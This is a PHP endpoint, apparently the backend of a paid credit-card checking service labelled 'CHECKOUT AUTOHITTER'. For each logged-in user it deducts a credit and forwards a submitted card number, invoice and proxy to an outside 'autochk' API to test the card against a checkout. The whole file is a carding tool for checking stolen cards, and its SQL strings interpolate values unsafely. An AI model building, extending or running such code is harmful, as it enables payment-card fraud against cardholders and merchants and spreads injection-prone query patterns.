<?php
include('../config.php');
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['user_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Not logged in']);
    exit();
}

$user_id = $_SESSION['user_id'];

// Fetch user info
$sql = "SELECT username, credit FROM users WHERE id = '$user_id' LIMIT 1";
$result = mysqli_query($conn, $sql);
$user = mysqli_fetch_assoc($result);

if (!$user || $user['credit'] <= 0) {
    echo json_encode(['status' => 'error', 'message' => 'No credits left']);
    exit();
}

// Deduct credit
mysqli_query($conn, "UPDATE users SET credit = credit - 1 WHERE id = '$user_id'");

// POST data
$cc = $_POST['cc'] ?? '';
$invoice = $_POST['invoice'] ?? '';
$proxy = $_POST['proxy'] ?? '';

if (empty($cc) || empty($invoice) || empty($proxy)) {
    echo json_encode(['status' => 'error', 'message' => 'Missing required parameters.']);
    exit();
}

// API request
$api_url = 'https://the7throom.io/api/autochk.php';
$query = http_build_query([
    'proxy' => $proxy,
    'invoice' => $invoice,
    'card' => $cc
]);

$start = microtime(true);
$response = @file_get_contents($api_url . '?' . $query);
$end = microtime(true);
$time_taken = round($end - $start, 2);

if (!$response) {
    echo json_encode(['status' => 'error', 'message' => 'API request failed']);
    exit();
}

$decoded = json_decode($response, true);

// Just return the original status, message, and raw info
echo json_encode([
    'status' => $decoded['status'] ?? 'UNKNOWN',
    'message' => $decoded['response_message'] ?? ($decoded['error'] ?? 'No message'),
    'time' => $decoded['time_taken'] ?? "{$time_taken}s",
    'card' => $decoded['card'] ?? $cc,
    'gateway' => 'CHECKOUT AUTOHITTER',
    'raw' => $decoded
]);
